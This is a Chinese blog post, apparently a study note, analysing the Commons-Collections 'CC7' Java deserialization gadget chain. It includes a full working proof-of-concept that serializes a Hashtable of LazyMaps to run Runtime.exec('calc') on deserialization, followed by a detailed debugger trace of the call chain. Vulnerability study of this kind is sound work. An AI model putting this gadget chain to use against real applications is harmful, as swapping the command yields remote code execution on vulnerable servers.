@@ -1,0 +1,257 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>8、CC7 | fangmjiu</title><meta name="author" content="lan"><meta name="copyright" content="lan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CC7利用版本jdk8（这里用的jdk8u201） &amp;&amp; Commons-Collections 3.1-3.2.1 CC7 Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667">
+<meta property="og:type" content="article">
+<meta property="og:title" content="8、CC7">
+<meta property="og:url" content="http://example.com/2023/08/25/8%E3%80%81CC7/index.html">
+<meta property="og:site_name" content="fangmjiu">
+<meta property="og:description" content="CC7利用版本jdk8（这里用的jdk8u201） &amp;&amp; Commons-Collections 3.1-3.2.1 CC7 Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/12.png">
+<meta property="article:published_time" content="2023-08-25T01:39:14.000Z">
+<meta property="article:modified_time" content="2023-08-25T01:39:14.265Z">
+<meta property="article:author" content="lan">
+<meta property="article:tag" content="利用链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/12.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/25/8%E3%80%81CC7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '8、CC7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-25 09:39:14'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="fangmjiu"><span class="site-name">fangmjiu</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">8、CC7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-25T01:39:14.000Z" title="发表于 2023-08-25 09:39:14">2023-08-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-25T01:39:14.265Z" title="更新于 2023-08-25 09:39:14">2023-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h2><p>jdk8（这里用的jdk8u201） &amp;&amp; Commons-Collections 3.1-3.2.1</p>
+<h2 id="CC7-Demo"><a href="#CC7-Demo" class="headerlink" title="CC7 Demo"></a>CC7 Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">        <span class="comment">//先设置假的 Transformer 数组，防止生成时执行命令</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 transformer 数组</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>CC7和CC5、CC6差不多，，调用命令的部分和CC6一模一样</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/29b5b390-3b1b-4b2a-a266-7f6437214fd4.png"></p>
+<p>不同LayzMap对象封装到Hashtable对象中，序列化的对象是Hashtable对象</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/3f84a074-b0fc-422b-9460-f69efbc1e12a.png"></p>
+<p>这里直接在demo中readObject处打一个断点进行调试，因为demo中序列化的是一个Hashtable对象，所以调用链从Hashtable.readObject()开始</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/1afc1052-72b0-41c0-bed4-d27f62f850f2.png"></p>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><ol>
+<li>Hashtable.readObject()</li>
+<li>Hashtable.reconstitutionPut()</li>
+<li>AbstractMapDecorator.equals()</li>
+<li>AbstractMap.equals()</li>
+<li>LazyMap.get()</li>
+</ol>
+<h3 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h3><p>在Hashtable.readObject()打一个断点，然后调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/ef37f268-41ef-49fc-86a7-7c14cae2e189.png"></p>
+<p>这里elements（对象）有是2，代表有两个元素</p>
+<p>这是因为demo中把两个LazyMap对象给封装到了Hashtable对象中</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/1b4c5cc1-eb02-4c56-99d5-51ebc18ef14a.png"></p>
+<p>继续向下分析</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/7ed6da7e-f960-402d-85cd-bf33fa8f1db8.png"></p>
+<p>首先第一个元素的key是一个LazyMap对象，他的key是yy，这里对应的是lazyMap1，继续调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/676bba9d-14cd-4f94-a038-9e2820c7556a.png"></p>
+<p>第二个元素的也是一个LazyMap对象，他的key是zZ，这里对应的是lazyMap1</p>
+<p>最后都会将key和value传入reconstitutionPut()方法</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/cf44d58d-f6f9-4642-92ad-eff0e2484dd9.png"></p>
+<h3 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h3><p>在Hashtable.reconstitutionPut()打一个断点，然后调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/0811e98a-e67b-489e-970b-78de998241ab.png"></p>
+<p>首先这里传入的key，是lazyMap1</p>
+<p>这里先是计算了key（lazyMap1）的hash为3873，然后计然后计算了hash在tab中的位置</p>
+<p>但是tab[index]并没有值，因为此时tab里面没有任何元素，为null</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/f3d885e5-7c64-4ddf-971f-ac5b2eadbbe0.png"></p>
+<p>所以e为null，不会进入for循环，而是进入到后面1248行的代码逻辑</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/af61dcfc-8902-4834-8c1e-3d64dba9543a.png"></p>
+<p>先把tab[index]（null）赋值给e</p>
+<p>然后将计算出来的hash、key和其他的变量value、e给传入到tab[index]进行赋值</p>
+<p>我们继续调试</p>
+<p>后面再一次进入了reconstitutionPut()方法，此时传入的key是lazyMap2</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/a73959be-d9ab-40c2-8304-d7cc1fe67af6.png"></p>
+<p>而key的hash和第一次进入reconstitutionPut()计算的hash一样，都是3873，所以他们在tab中的位置是一样的</p>
+<p>又因为第一次进入reconstitutionPut()时候给tab[index]赋值了，所以这次就会进入for循环</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/5a246600-4064-4a7f-b374-c52affd06220.png"></p>
+<p>此时e就是tab[index]，tab[index]的key就是lazyMap1</p>
+<p>而且这里还将key（LazyMap2）传给了e.key（LazyMap）.equals()</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/255be8a8-d269-4b89-993f-a9caba70b8d1.png"></p>
+<p>所以接下来得跟进LazyMap.equals()</p>
+<h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><p>这里有个问题，按道理说在调用链里面，应该是触发LazyMap.equals()，为什么后面的是触发AbstractMapDecorator.equals()方法？</p>
+<p>因为AbstractMapDecorator是LazyMap的父类</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/e957ff1d-1938-43d6-9c93-5979ac6788c3.png"></p>
+<p>LazyMap既然继承于AbstractMapDecorator，那AbstractMapDecorator的方法和成员变量LazyMap理应也一并继承了的，LazyMap不存在equals()方法，但是他的父类AbstractMapDecorator有，所以就调用AbstractMapDecorator.equals()</p>
+<p>我们在AbstractMapDecorator.equals()打个断点，继续调试分析</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/602e2561-d918-4c61-84cb-f09e56e30f95.png"></p>
+<p>这里首先判断传入的Object对象object是否是当前对象，如果是，就返回true</p>
+<p>但是这里当前对象是lazyMap1，而传入的是lazyMap2，所以就进入129行的代码，调用了map.equals(object)</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/08dc1020-5225-4dbc-9e3a-f62d01e5fb23.png"></p>
+<p>此时的成员变量map，是一个HashMap对象</p>
+<p>对应的赋值是在demo中将给lazyMap1赋值的时候</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/18e42de7-0dcb-48b2-bc95-94ff69fa0f3d.png"></p>
+<p>所以接下来得跟进HashMap.equals()</p>
+<h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><p>和LazyMap.equals()的情况一模一样，HahsMap没有equals()方法，所以这里也是调用HashMap父类AbstractMap的equals()方法</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/a6a56858-7cb5-4578-8b5a-32fd09d55d90.png"></p>
+<p>在AbstractMap.equals()那里打个断点继续调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/1e7e1b7b-fc02-4989-a465-76b741528462.png"></p>
+<p>这里equals()传入的Object对象o是lazyMap2</p>
+<p>在代码第481行时，将o赋值给Map对象m（对象m就成了LazyMap对象）</p>
+<p>在代码第495行时，调用了m.get()方法（相当于调用了LazyMap.get()方法），此时的key是yy</p>
+<p>继续跟进LazyMap.get()方法</p>
+<h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p>在LazyMap.get()打个断点，继续调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/a7099be0-e86f-43dc-8d95-1fa1e5b7d0e7.png"></p>
+<p>这里先会判断传入的key是否在成员变量map中，此时传入的key是“yy”，成员变量map是“zZ-&gt;1”，yy不在map中，所以会进入if语句中，成功进入到157行，成功触发factory.transform(key)，即后续的命令执行链</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/3b039944-4cb0-4605-8a39-231ef1790d04.png"></p>
+<p>成功弹出计算器</p>
+<h2 id="其他代码"><a href="#其他代码" class="headerlink" title="其他代码"></a>其他代码</h2><h3 id="fakeTransformer"><a href="#fakeTransformer" class="headerlink" title="fakeTransformer"></a>fakeTransformer</h3><p><img src="https://s3.hedgedoc.org/demo/uploads/4a09d3b8-7e53-47d1-8e0b-21f9a98e313a.png"></p>
+<p>这里设置fakeTransformer的原因很简单，因为在hashtable.put()方法的时候，会调用LazyMap.get()方法</p>
+<p>这里直接在hashtable.put()中打个断点调试</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/113d0f52-d52e-48ba-b2c9-a6a179bed460.png"></p>
+<p>这样在没有反序列化的时候，就触发了命令执行，后续反序列化的时候就无法触发命令执行链了，不符合我们的预期，所以得先设置一个空的命令执行链，以免在调用hashtable.put()的时候触发命令执行</p>
+<p>当然，在调用完hashtable.put()后，需要将空的Transformer数组对象换成能调用命令的Transformer数组对象</p>
+<p>demo中用的是将Transformer数组对象封装进ChainedTransformer对象中的，也就是赋值给成员iTransformers的</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/c135cce7-9626-4ac3-b99c-65bba1fb6442.png"></p>
+<p>而成员变量iTransformers是用private修饰的，所以需要用反射修改</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/caf479cb-f6ef-438d-b023-88088cbdd4b3.png"></p>
+<h3 id="lazyMap2-remove-“yy”"><a href="#lazyMap2-remove-“yy”" class="headerlink" title="lazyMap2.remove(“yy”);"></a>lazyMap2.remove(“yy”);</h3><p><img src="https://s3.hedgedoc.org/demo/uploads/08f9940d-bb92-4ae7-badc-0e130485ef0b.png"></p>
+<p>为什么要移除lazyMap2中的键对“yy”，因为在调用hashtable.put(lazyMap2, “test”);的时候，就会再添加一个yy-&gt;yy</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/2b5ed482-619a-43e4-bed6-bac74224fae5.png"></p>
+<p>这样会影响AbstractMap.equals()调用链的调用过程，不会进入LazyMap.get()链中</p>
+<p><img src="https://s3.hedgedoc.org/demo/uploads/1b8fa5ad-aa80-4496-acf9-f0f4eba5adfb.png"></p>
+<p>所以需要在demo代码中将“yy-&gt;yy”去掉</p>
+<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9409">https://xz.aliyun.com/t/9409</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/647418911">https://zhuanlan.zhihu.com/p/647418911</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1809858">https://cloud.tencent.com/developer/article/1809858</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">lan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/25/8%E3%80%81CC7/">http://example.com/2023/08/25/8%E3%80%81CC7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">fangmjiu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%88%A9%E7%94%A8%E9%93%BE/">利用链</a></div><div class="post_share"><div class="social-share" data-image="/img/12.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat冰蝎内存马"><img class="cover" src="/img/13.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tomcat冰蝎内存马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/08/22/1%E3%80%81CC1-1/" title="1、CC1-1"><img class="cover" src="/img/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">1、CC1-1</div></div></a></div><div><a href="/2023/08/22/2%E3%80%81CC1-2/" title="2、CC1-2"><img class="cover" src="/img/2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">2、CC1-2</div></div></a></div><div><a href="/2023/08/22/3%E3%80%81CC3/" title="3、CC3"><img class="cover" src="/img/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-22</div><div class="title">3、CC3</div></div></a></div><div><a href="/2023/08/22/4%E3%80%81CC2/" 